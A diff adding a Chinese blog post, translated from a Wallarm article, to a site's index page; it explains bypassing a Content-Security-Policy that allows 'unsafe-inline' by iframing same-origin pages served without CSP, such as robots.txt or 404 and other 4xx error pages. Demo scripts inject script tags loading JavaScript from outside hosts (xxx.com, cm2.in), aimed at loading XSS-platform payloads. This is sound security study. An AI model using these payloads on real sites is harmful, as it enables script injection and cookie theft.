@@ -63,6 +63,107 @@
 
   
     
+    <h3 class="article-title"><a href="/2018/07/15/CSP-unsafe-inline时-引入外部js/"><span>CSP unsafe-inline时, 引入外部js</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2018/07/15/CSP-unsafe-inline时-引入外部js/" rel="bookmark">
+        <time class="entry-date published" datetime="2018-07-15T02:42:07.000Z">
+          2018-07-15
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>原文: <a target="_blank" rel="noopener" href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa">https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa</a><br>用自己的理解, 把这个文章比较通俗的翻译补充了一下。</p>
+<hr>
+<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>当csp有Unsafe-inline时, 并且受限于csp无法直接引入外部js, 当frame-src 为self, 或者能引入当前域的资源的时候, 即有一定可能能够引入外部js。</p>
+<hr>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>虽说在CSP有unsafe-inline的时候, 已经能够很轻松的把cookie给传递出去了。 但是如果想引入xss平台的js的时候, 也很麻烦。 因为xss平台的js因为功能很多, 所以通常js文件都很大, 在unsafe-inline的情况下,很可能有长度限制之类的导致没法执行到xss平台的js。 </p>
+<p>CSP测试环境。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: <span class="keyword">default</span>-src <span class="string">&#x27;self&#x27;</span> <span class="string">&#x27;unsafe-inline&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在上CSP的时候, 一些静态文件中是可能不上CSP的。并且如果这个静态文件没有 X-Frame-Options: Deny(禁止该文件被iframe)响应头的话,这个时候我们iframe去打开这个没有CSP的静态文件, iframe相当于另外打开一个窗口,因为是同源的, 然后我们操作dom往iframe新打开的窗口里写入script标签去引入外部js, 就可以无视script-src self的限制了。</p>
+<p>demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> frame = document.createElement(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">    frame.href = <span class="string">&quot;/robots.txt&quot;</span>;</span><br><span class="line">    document.body.appendChild(frame);</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> script = document.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">        script.src = <span class="string">&#x27;//xxx.com/a.js&#x27;</span>;</span><br><span class="line">        window.frames[<span class="number">0</span>].document.body.appendChild(script);</span><br><span class="line">    &#125;,<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="http://onw16foqc.bkt.clouddn.com/15316201005176.jpg"></p>
+<p><img src="http://onw16foqc.bkt.clouddn.com/15316201220145.jpg"></p>
+<p>成功加载了外部的js了。</p>
+<p>但是如果是在nginx的配置文件中, add_header 来做csp的话,</p>
+<p>那么所有静态文件中, 也会返回CSP。<br>在nginx文档中有写到,</p>
+<blockquote>
+<p>Directives<br>Syntax:    add_header name value [always];<br>Default:    —<br>Context:    http, server, location, if in location<br>Adds the specified field to a response header provided that the response code equals 200, 201 (1.3.10), 204, 206, 301, 302, 303, 304, 307 (1.1.16, 1.0.13), or 308 (1.13.0). The value can contain variables.</p>
+</blockquote>
+<blockquote>
+<p>There could be several add_header directives. These directives are inherited from the previous level if and only if there are no add_header directives defined on the current level.</p>
+</blockquote>
+<blockquote>
+<p>If the always parameter is specified (1.7.5), the header field will be added regardless of the response code.</p>
+</blockquote>
+<p>当没有设置always的时候, 如果response code为4xx或者5xx的时候, add_header 不会起作用。 那么当这个时候, 我们可以iframe引入4xx/5xx的页面, 然后往4xx/5xx的页面里面dom里插入script标签。 如果设置了always的话, 无论什么response code, 都会添加响应头。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_header Content-Security-Policy &quot;default-src &#39;self&#39; &#39;unsafe-inline&#39;;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>配置文件中加上add_header, csp<br><img src="http://onw16foqc.bkt.clouddn.com/15316204267818.jpg"></p>
+<p><img src="http://onw16foqc.bkt.clouddn.com/15316205958389.jpg"></p>
+<p>静态文件中也都有了csp了。<br>这里我们利用4xx页面, 4xx页面最简单的肯定就是404了。<br>当然还有一些其他触发4xx页面的方法。</p>
+<p>1)超长url</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var frame &#x3D; document.createElement(&quot;iframe&quot;);</span><br><span class="line">frame.src &#x3D; &quot;a&quot;.repeat(10000);</span><br><span class="line">document.body.appendChild(frame);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="http://onw16foqc.bkt.clouddn.com/15316212060660.jpg"></p>
+<p>2)超长cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    for(var i&#x3D;0;i&lt;5;i++)&#123;document.cookie&#x3D;i+&quot;&#x3D;&quot;+&quot;a&quot;.repeat(10000)&#125;;</span><br><span class="line">    var frame &#x3D; document.createElement(&quot;iframe&quot;);</span><br><span class="line">    frame.src &#x3D; &quot;a&quot;;</span><br><span class="line">    document.body.appendChild(frame);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="http://onw16foqc.bkt.clouddn.com/15316214231361.jpg"><br>3)不正确的unicode路径<br>utf不存在g开头的,<br><img src="http://onw16foqc.bkt.clouddn.com/15316217028727.jpg"></p>
+<p>4)<br>nginx在主目录上继续往上级目录跳的时候, 也会出现400<br><img src="http://onw16foqc.bkt.clouddn.com/15316217870523.jpg"></p>
+<p>不过相比起这些4xx, 肯定404是最好找到的了。<br>不过现在404各种风格, 也有404页面的reponse code为200或者302的。 那么上面那些其他4xx的就有作用了。</p>
+<p>add_header设置csp后。<br><img src="http://onw16foqc.bkt.clouddn.com/15316206301550.jpg"></p>
+<p>404页面中没有csp。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> frame = document.createElement(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">    frame.src = <span class="string">&quot;/404notfound&quot;</span>;</span><br><span class="line">    document.body.appendChild(frame);</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> script = document.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">        script.src = <span class="string">&#x27;//xxx.com/a.js&#x27;</span>;</span><br><span class="line">        window.frames[<span class="number">0</span>].document.body.appendChild(script);</span><br><span class="line">    &#125;,<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="http://onw16foqc.bkt.clouddn.com/15316207621780.jpg"></p>
+<p><img src="http://onw16foqc.bkt.clouddn.com/15316207741758.jpg"></p>
+<p>可以引入外部js了。<br>当然这种引入4xx/5xx页面的方法, 如果add_header的时候设置了always的话, 也是没办法利用的了。</p>
+<p>除了iframe以外, object和embed也可以, 一样的原理。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> embed = document.createElement(<span class="string">&quot;embed&quot;</span>);</span><br><span class="line">    embed.src = <span class="string">&quot;/hhhhhhh&quot;</span>;</span><br><span class="line">    document.body.appendChild(embed);</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> script = document.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">        script.src = <span class="string">&#x27;//cm2.in/12&#x27;</span>;</span><br><span class="line">        window.frames[<span class="number">0</span>].document.body.appendChild(script);</span><br><span class="line">    &#125;,<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="http://onw16foqc.bkt.clouddn.com/15316222985557.jpg"></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa">https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/Web/">Web</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
     <h3 class="article-title"><a href="/2018/07/07/phpMyAdmin4-8-1-文件包含漏洞/"><span>phpMyAdmin4.8.1 文件包含漏洞</span></a></h3>
     
   
